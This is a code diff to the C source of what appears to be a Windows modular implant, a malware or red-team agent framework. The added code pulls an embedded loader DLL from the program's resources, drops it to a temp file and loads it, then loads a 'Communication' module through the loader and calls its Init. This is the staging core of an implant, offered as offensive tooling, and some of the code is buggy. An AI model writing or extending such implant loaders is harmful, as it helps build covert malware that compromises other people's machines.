@@ -2,6 +2,7 @@
 
 #include <stdio.h>
 
+#include "ImplantModule.h"
 #include "ModularImplant.h"
 
 INT
@@ -12,9 +13,42 @@ wmain(INT argc, PWSTR argv[])
 	*	1. Load embedded modules from resources
 	*	2. Load comms module using loader
 	*/
-	LOADED_MODULE lmLoader = { 0 };
+	IMPLANT_CONFIG ImplantConfig = { 0 };
+	LOADED_MODULE lmLoader = { 0 },
+		lmCommunication = { 0 };
+	PVOID pCommModule = NULL;
+	DWORD dwCommModuleSize = 0;
+	MODULE_INIT fnInit = NULL;
 	
-	LoadEmbeddedLoader(&lmLoader);
+	if (FALSE == LoadEmbeddedLoader(&lmLoader))
+	{
+		LOG_ERROR("LoadEmbeddedLoader failed");
+		return EXIT_FAILURE;
+	}
+
+	ImplantConfig.fnLoader = (IMPLANT_LOADER)GetProcAddress(lmLoader.hModule, "LoadImplantModule");
+	if (NULL == ImplantConfig.fnLoader)
+	{
+		LOG_ERROR("GetProcAddress failed");
+	}
+
+	if (FALSE == GetResourceData(NULL, MIRID_Communication, &pCommModule, &dwCommModuleSize))
+	{
+		LOG_ERROR("GetResourceData failed");
+	}
+
+	if (FALSE == ImplantConfig.fnLoader(pCommModule, dwCommModuleSize, &lmCommunication))
+	{
+		LOG_ERROR("Loading Communication Module failed");
+	}
+
+	fnInit = (MODULE_INIT)GetProcAddress(lmCommunication.hModule, "Init");
+	if (NULL == fnInit)
+	{
+		LOG_ERROR("GetProcessAddress failed");
+	}
+
+	fnInit(MODULE_INIT_LOCAL, lmCommunication.hModule);
 
 	if (lmLoader.hModule &&
 			FALSE == FreeLibrary(lmLoader.hModule))
@@ -106,7 +140,7 @@ LoadEmbeddedLoader(
 {
 	HRSRC hrsrcLoader = NULL;
 	HGLOBAL hgLoader = NULL;
-	PVOID lpLoaderData = NULL;
+	PVOID pLoaderData = NULL;
 	DWORD dwLoaderSize = 0, dwTempFileNameLen = MAX_PATH;
 	PWSTR pwszTempFileName = NULL;
 	HMODULE hmLoader = NULL;
@@ -130,35 +164,13 @@ LoadEmbeddedLoader(
 		return FALSE;
 	}
 
-	hrsrcLoader = FindResourceW(NULL, MAKEINTRESOURCEW(Loader), RT_RCDATA);
-	if (NULL == hrsrcLoader)
+	if (FALSE == GetResourceData(NULL, MIRID_Loader, &pLoaderData, &dwLoaderSize))
 	{
-		LOG_ERROR("FindResource failed");
+		HeapFree(GetProcessHeap(), 0, pwszTempFileName);
 		return FALSE;
 	}
 
-	hgLoader = LoadResource(NULL, hrsrcLoader);
-	if (NULL == hgLoader)
-	{
-		LOG_ERROR("LoadResource failed")
-		return FALSE;
-	}
-
-	dwLoaderSize = SizeofResource(NULL, hrsrcLoader);
-	if (0 == dwLoaderSize)
-	{
-		LOG_ERROR("SizeofResource failed");
-		return FALSE;
-	}
-
-	lpLoaderData = LockResource(hgLoader);
-	if (NULL == lpLoaderData)
-	{
-		LOG_ERROR("LockResource failed");
-		return FALSE;
-	}
-
-	if (FALSE == WriteDataToFile(pwszTempFileName, lpLoaderData, dwLoaderSize))
+	if (FALSE == WriteDataToFile(pwszTempFileName, pLoaderData, dwLoaderSize))
 	{
 		return FALSE;
 	}
@@ -167,6 +179,7 @@ LoadEmbeddedLoader(
 	if (NULL == hmLoader)
 	{
 		LOG_ERROR("LoadLibrary failed");
+		return FALSE;
 	}
 	else
 	{
@@ -214,6 +227,61 @@ WriteDataToFile(
 	}
 
 	CloseHandle(hTempFile);
+
+	return TRUE;
+}
+
+BOOL
+GetResourceData(
+	HMODULE hModule,
+	INT iResourceId,
+	PVOID *ppResourceData,
+	PDWORD pdwResourceSize)
+{
+	HRSRC hrsrcImplant = NULL;
+	HGLOBAL hgResource = NULL;
+	PVOID pResourceData = NULL;
+	DWORD dwResourceSize = 0;
+	HMODULE hmResource = NULL;
+
+	if (!(ppResourceData && pdwResourceSize))
+	{
+		LOG_ERROR("Invalid parameter");
+		return FALSE;
+	}
+	*ppResourceData = NULL;
+	*pdwResourceSize = 0;
+
+	hrsrcImplant = FindResourceW(hModule, MAKEINTRESOURCEW(iResourceId), RT_RCDATA);
+	if (NULL == hrsrcImplant)
+	{
+		LOG_ERROR("FindResource failed");
+		return FALSE;
+	}
+
+	hgResource = LoadResource(hModule, hrsrcImplant);
+	if (NULL == hgResource)
+	{
+		LOG_ERROR("LoadResource failed")
+			return FALSE;
+	}
+
+	dwResourceSize = SizeofResource(hModule, hrsrcImplant);
+	if (0 == dwResourceSize)
+	{
+		LOG_ERROR("SizeofResource failed");
+		return FALSE;
+	}
+
+	pResourceData = LockResource(hgResource);
+	if (NULL == pResourceData)
+	{
+		LOG_ERROR("LockResource failed");
+		return FALSE;
+	}
+
+	*ppResourceData = pResourceData;
+	*pdwResourceSize = dwResourceSize;
 
 	return TRUE;
 }
